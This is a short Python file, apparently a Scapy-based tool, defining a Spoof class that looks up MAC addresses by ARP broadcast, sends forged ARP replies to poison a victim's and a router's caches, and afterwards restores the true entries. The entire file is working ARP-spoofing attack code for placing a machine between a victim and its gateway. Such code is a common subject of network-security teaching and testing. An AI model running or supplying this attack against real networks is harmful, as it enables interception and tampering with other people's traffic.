from scapy.all import *
class Spoof():
    def originalMAC(self, ip):
        # srp is for layer 2 packets with Ether layer, sr is for layer 3 packets like ARP and IP
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=5, retry=3)
        for s, r in ans:
            return r.sprintf("%Ether.src%")

    def poison(self, routerIP, victimIP, routerMAC, victimMAC):
        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))

    def restore(self, routerIP, victimIP, routerMAC, victimMAC):
        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)

